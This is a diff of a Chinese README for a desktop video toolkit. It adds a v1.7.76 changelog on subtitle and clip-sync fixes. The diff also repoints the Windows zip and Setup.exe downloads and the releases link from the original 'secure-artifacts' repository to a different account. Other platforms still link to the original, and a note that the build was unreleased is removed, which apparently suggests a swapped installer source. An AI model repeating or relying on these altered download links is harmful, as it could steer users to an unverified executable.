@@ -2,9 +2,18 @@
 
 一站式桌面视频工作台，将批量截图、智能剪辑、Reels 编辑、批量重命名、元数据清理、字幕提取和自动上传填表集中在同一个 PySide6 界面中。
 
-当前版本：**v1.7.75**
+当前版本：**v1.7.76**
 
 功能总览见 [`docs/FEATURES.md`](docs/FEATURES.md)。
+
+### v1.7.76 · 2026-10-19
+
+- **字幕预览与导出**：语音字幕统一使用 Qt 绘制，长片和密集字幕保持相同字距、换行与样式。
+- **识别时间轴**：检查中间空档并补识别；分段交界词只保留一次；按画面时长校验字幕，拒绝异常超长时间戳。
+- **剪辑同步**：修复裁剪后重提字幕重复偏移、短词被强制拉长、修重叠导致后续字幕越来越晚。
+- **字幕缓存**：增加素材与字幕校验；同名或被替换的素材不再自动复用旧旁路字幕。
+- **元数据水印**：按源码率控制重新编码体积，显示处理前后的文件大小。
+- 已有错误字幕请重新提取；旧 SRT 可通过「载入 SRT」手动导入。迁移新旁路词轴时请一起复制素材、`.words.srt` 和 `.words.json`。
 
 ### v1.7.75 · 2026-10-16
 
@@ -92,9 +101,9 @@
 - “剪辑后自动重提”默认关闭，需要时可以手动点击“裁剪后重提”，避免每次编辑都重复烘焙和识别。
 
 源码回归：`python -B test_caption_clock_regression.py`、`python -B test_post_cut_caption_sync.py`。
-本候选未打包或发布；真实口播识别精度与长视频性能仍需使用实际素材验收。
+真实口播识别精度与长视频性能仍需使用实际素材核对。
 
-[查看最新版本与更新说明](https://github.com/secure-artifacts/video-toolkit/releases/latest)
+[查看最新版本与更新说明](https://github.com/christiancagfr-alt/video-toolkit/releases/latest)
 
 ## Reels 编辑器界面结构
 
@@ -146,7 +155,7 @@ BGM/文字配音的切片与时间位置也会合成为独立音轨。分组合�
 
 | 系统 | 安装包 |
 | --- | --- |
-| Windows 10/11 x64 | [video-toolkit-windows-x64-v1.7.69.zip](https://github.com/secure-artifacts/video-toolkit/releases/download/v1.7.69/video-toolkit-windows-x64-v1.7.69.zip) · [安装包 Setup](https://github.com/secure-artifacts/video-toolkit/releases/download/v1.7.69/VideoToolkit_Setup_v1.7.69.exe) |
+| Windows 10/11 x64 | [video-toolkit-windows-x64-v1.7.76.zip](https://github.com/christiancagfr-alt/video-toolkit/releases/download/v1.7.76/video-toolkit-windows-x64-v1.7.76.zip) · [安装包 Setup](https://github.com/christiancagfr-alt/video-toolkit/releases/download/v1.7.76/VideoToolkit_Setup_v1.7.76.exe) |
 | Linux x64 | [video-toolkit-linux-x64-v1.7.69.zip](https://github.com/secure-artifacts/video-toolkit/releases/download/v1.7.69/video-toolkit-linux-x64-v1.7.69.zip) |
 | macOS Apple Silicon | [video-toolkit-macos-arm64-v1.7.69.zip](https://github.com/secure-artifacts/video-toolkit/releases/download/v1.7.69/video-toolkit-macos-arm64-v1.7.69.zip) |
 | macOS Intel | [video-toolkit-macos-x64-v1.7.69.zip](https://github.com/secure-artifacts/video-toolkit/releases/download/v1.7.69/video-toolkit-macos-x64-v1.7.69.zip) |
